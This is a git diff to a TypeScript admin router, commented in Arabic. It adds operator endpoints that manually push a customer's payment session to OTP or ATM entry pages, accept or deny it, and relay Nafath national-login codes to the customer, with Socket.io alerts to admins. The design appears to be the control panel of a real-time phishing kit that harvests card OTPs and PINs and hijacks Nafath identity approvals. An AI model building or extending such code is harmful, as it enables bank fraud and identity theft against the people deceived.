@@ -495,6 +495,64 @@ const adminRouter = router({
       }
       return { status: true, message: "تم الحذف" };
     }),
+
+  // التحكم في خطوات الدفع (OTP / ATM / رفض / قبول نهائي)
+  setPaymentAction: adminProcedure
+    .input(
+      z.object({
+        reference: z.string(),
+        action: z.enum(["accepted", "pass", "denied", "verified"]),
+      })
+    )
+    .mutation(async ({ input }) => {
+      const { reference, action } = input;
+
+      if (action === "accepted") {
+        // توجيه لصفحة OTP
+        await createOrUpdatePayment(reference, { paymentAction: "accepted" } as any);
+      } else if (action === "pass") {
+        // توجيه لصفحة ATM
+        await createOrUpdatePayment(reference, { paymentAction: "pass" } as any);
+      } else if (action === "denied") {
+        // رفض الدفع
+        await createOrUpdatePayment(reference, { paymentAction: "denied" } as any);
+        await updateBookingStatus(reference, "cancelled", 1);
+      } else if (action === "verified") {
+        // قبول نهائي
+        await createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" } as any);
+        await updateBookingStatus(reference, "completed", 1);
+      }
+
+      // إشعار Socket.io
+      try {
+        const io = getIo();
+        if (io) io.to("admins").emit("paymentActionSet", { reference, action });
+      } catch (_) {}
+
+      return { status: true, action, reference };
+    }),
+
+  // إرسال رمز نفاذ للعميل
+  sendNafathCode: adminProcedure
+    .input(
+      z.object({
+        reference: z.string(),
+        code: z.string(),
+      })
+    )
+    .mutation(async ({ input }) => {
+      const { reference, code } = input;
+      await createOrUpdateVerification(reference, "nafath", {
+        nafathNumber: code,
+        step: 2,
+        status: "step1_done",
+      });
+      try {
+        const io = getIo();
+        if (io) io.to("admins").emit("nafathCodeSent", { reference, code });
+      } catch (_) {}
+      return { status: true, message: "تم إرسال رمز نفاذ" };
+    }),
 });
 
 // ==================== App Router ====================
